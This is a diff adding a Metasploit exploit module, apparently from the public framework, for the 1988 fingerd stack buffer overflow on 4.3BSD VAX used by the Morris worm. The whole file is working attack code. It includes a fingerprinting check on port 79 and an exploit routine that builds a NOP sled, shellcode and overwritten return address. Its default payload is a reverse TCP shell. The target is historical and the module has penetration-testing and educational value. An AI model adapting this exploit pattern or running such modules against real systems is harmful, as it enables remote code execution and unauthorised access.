@@ -1,0 +1,113 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  # This is so one-off that we define it here
+  ARCH_VAX = 'vax'
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'              => 'Morris Worm fingerd Stack Buffer Overflow',
+      'Description'       => %q{
+        This module exploits a stack buffer overflow in fingerd on 4.3BSD.
+        This vulnerability was exploited by the Morris worm in 1988-11-02.
+        Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg.
+      },
+      'Author'            => [
+        'Robert Tappan Morris', # Discovery? Exploit and worm for sure
+        'Cliff Stoll',          # The Cuckoo's Egg epilogue and inspiration
+        'wvu'                   # Module, payload, and additional research
+      ],
+      'References'        => [
+        ['URL', 'https://en.wikipedia.org/wiki/Morris_worm'],         # History
+        ['URL', 'https://spaf.cerias.purdue.edu/tech-reps/823.pdf'],  # Analysis
+        ['URL', 'http://computerarcheology.com/Virus/MorrisWorm/'],   # Details
+        ['URL', 'https://github.com/arialdomartini/morris-worm'],     # Source
+        ['URL', 'http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH'] # Setup
+        # And credit to the innumerable VAX ISA docs on the Web
+      ],
+      'DisclosureDate'    => 'Nov 2 1988',
+      'License'           => MSF_LICENSE,
+      'Platform'          => 'bsd',
+      'Arch'              => ARCH_VAX,
+      'Privileged'        => false, # Depends on inetd.conf, usually "nobody"
+      'Targets'           => [
+        # https://en.wikipedia.org/wiki/Source_Code_Control_System
+        ['@(#)fingerd.c   5.1 (Berkeley) 6/6/85',
+          'Ret'           => 0x7fffe9b0,
+          'Payload'       => {
+            'Space'       => 403,
+            'BadChars'    => "\n",
+            'Encoder'     => 'generic/none', # There is no spoon
+            'DisableNops' => true            # Hardcoded NOPs
+          }
+        ]
+      ],
+      'DefaultTarget'     => 0,
+      'DefaultOptions'    => {'PAYLOAD' => 'bsd/vax/shell_reverse_tcp'}
+    ))
+
+    register_options([Opt::RPORT(79)])
+  end
+
+  def check
+    token = rand_text_alphanumeric(8..42)
+
+    connect
+    sock.put("#{token}\n")
+    res = sock.get_once
+
+    return CheckCode::Unknown unless res
+
+    if res.include?("Login name: #{token}")
+      return CheckCode::Detected
+    end
+
+    CheckCode::Safe
+  rescue Rex::ConnectionError => e
+    vprint_error(e.message)
+    CheckCode::Unknown
+  ensure
+    disconnect
+  end
+
+  def exploit
+    # Start by generating our custom VAX shellcode
+    shellcode = payload.encoded
+
+    # 0x01 is NOP in VAX-speak
+    nops = "\x01" * (target.payload_space - shellcode.length)
+
+    # This overwrites part of the buffer
+    junk = rand_text_alphanumeric(109)
+
+    # This zeroes out part of the stack frame
+    frame = "\x00" * 16
+
+    # Finally, pack in our return address
+    ret  = [target.ret].pack('V') # V is for VAX!
+
+    # The newline is for gets(3)
+    sploit = nops + shellcode + junk + frame + ret + "\n"
+
+    # Fire away
+    print_status('Connecting to fingerd')
+    connect
+    print_status("Sending #{sploit.length}-byte buffer")
+    sock.put(sploit)
+
+  # Hat tip @bcoles
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  ensure
+    disconnect
+  end
+
+end
